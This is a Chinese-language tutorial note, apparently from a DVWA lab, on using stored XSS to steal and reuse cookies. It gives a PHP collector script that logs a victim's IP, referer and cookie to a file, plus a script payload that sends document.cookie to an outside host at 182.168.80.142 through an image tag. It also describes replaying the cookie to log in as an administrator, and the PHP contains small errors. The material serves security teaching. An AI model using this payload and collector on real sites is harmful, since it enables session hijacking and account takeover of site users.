[TOC]

## 准备
重置数据库:

![]((22)利用Xss盗取并利用cookie__files/30a947ad-6018-4267-bd55-4f481bd02d50.png)

看存储型跨站的源码:
![]((22)利用Xss盗取并利用cookie__files/0cc7dbae-948f-4794-8d67-df23f8d3c7cb.png)

```
<?php

if(isset($_POST['btnSign']))
{

   $message = trim($_POST['mtxMessage']);//用post方法接收你输入的内容
   $name    = trim($_POST['txtName']);//接收你输入的名字，这里用trim函数做的处理;trim函数:去掉字符串两边的空格
   
   // Sanitize message input
   $message = stripslashes($message);
   $message = mysql_real_escape_string($message);// mysql_real_escape_string这个函数实现转义！
   
   // Sanitize name input
   $name = mysql_real_escape_string($name);
  
   $query = "INSERT INTO guestbook (comment,name) VALUES ('$message','$name');";//将文件内容插入到数据库里面；
   
   $result = mysql_query($query) or die('<pre>' . mysql_error() . '</pre>' );//执行查询,把内容调出来
   
}

?> 

```
low级别存储型XSS:
![]((22)利用Xss盗取并利用cookie__files/1fc52d37-022f-4001-bf90-ede6b4449393.jpg)

![]((22)利用Xss盗取并利用cookie__files/dff65adb-5870-438d-aaa9-21ab78be6d8b.png)

![]((22)利用Xss盗取并利用cookie__files/a1748a70-c17d-4bd0-bafe-e411c0fc09f2.jpg)


![]((22)利用Xss盗取并利用cookie__files/5ff79584-9990-4a07-a0bd-ab329c92f0ab.jpg)
## XSS介绍
XSS两大功能:
1.盗取cookie;
2.挂马;
如果能够窃取 到管理员的cookie，就能够登录后台 ！
要有能接受cookie的地方,即:我偷到的cookie放哪儿


## 演示
![]((22)利用Xss盗取并利用cookie__files/5150267e-d5d6-4525-b9a2-f04f610dc0aa.jpg)

![]((22)利用Xss盗取并利用cookie__files/9cad7c6b-b324-4067-b59c-caae7ba4669c.jpg)

![]((22)利用Xss盗取并利用cookie__files/48542d0a-04e1-4ee9-873f-6c3737b7fed3.jpg)


```
<?php
$cookie = $_GET('cookie');//以GET方式获取cookie变量值
$ ip = getenv('REMOTE_ADDR');//远程主机的ip(就是说你从哪个地方偷过来的cookie,偷取cookie的网站的ip提取过来)
$time = date('Y-m-d g:i:s');//以年月日 ,时分秒的格式显示
$referer = getenv('HTTP_REFERER');//链接来源，referer是http协议头里面的一部分,可以获得被你偷取cookie的， 这个用户它在访问哪个页面的时候这个cookie被你窃取过来;能把页面的URL发过来;
$fp = fopen('cookie.txt','a');//打开cookie.txt，若不存在则创建它(这里将上面的信息写入这个文件，referer就是写入的内容)
fwrite($fp," IP ：".$IP."| Data and Time :".$Time." | Referer:" .$referer." | Cookie ：".$cookie."|||");//写入文件，双引号里面的内容原样输出;可能接受了很多cookie，接受文件的时候都是存放在 一行里面,这里在每一个cookie后面加了三个|，表示结束了
fclose($fp);

?>

```

### 验证:
服务器ip:
![]((22)利用Xss盗取并利用cookie__files/2a9d7c20-1e69-49a3-af97-958a3cecf0f1.jpg)

![]((22)利用Xss盗取并利用cookie__files/4f39b940-42f1-4585-bbe9-02ceac420c19.png)

![]((22)利用Xss盗取并利用cookie__files/7fcf7117-bd23-42ec-b58f-d2afd11e1509.jpg)

![]((22)利用Xss盗取并利用cookie__files/e4d27886-c924-4dd1-9a5b-affffe16ce37.png)
给网页传一个参数test;
传参之前:
![]((22)利用Xss盗取并利用cookie__files/aa233f58-135e-476b-bb69-d4367ba1ef1e.png)

在网站下面产生了cookie.txt;(好像我自己这里出现问题了？？)
![]((22)利用Xss盗取并利用cookie__files/73a1ce27-f60f-4260-a3ef-aaa317fb5b8e.jpg)

![]((22)利用Xss盗取并利用cookie__files/200be2f7-884f-4017-93b6-3fb45a541040.jpg)

### 怎么偷cookie:

```
<script>
document.write('<img src="http://182.168.80.142/getcookie ='+document.cookie+'" width =() heigt = () border=() />')
</script>
```
![]((22)利用Xss盗取并利用cookie__files/0fe57a48-1781-4964-af11-82827f35d7f9.jpg)
![]((22)利用Xss盗取并利用cookie__files/45854c54-2c37-474d-a4d8-985835bdc4e1.jpg)
原样输出之后再连接document.cookie;再连接宽度高度和border(这里设为0了)

为了增加输入的长度:
右击---》查看元素:

![]((22)利用Xss盗取并利用cookie__files/56abea28-b833-4383-9809-373a1a05dd76.png)

怎样利用cookie:
可以给firebox装一个插件_firebug;
![]((22)利用Xss盗取并利用cookie__files/db4fa169-24d4-44cb-a8d8-446f47c71c3b.png)

![]((22)利用Xss盗取并利用cookie__files/1e490a8c-4a14-42d3-960c-c1a4eef7b36d.png)

![]((22)利用Xss盗取并利用cookie__files/83576542-a6bc-485f-a218-f4c23e6e2344.png)



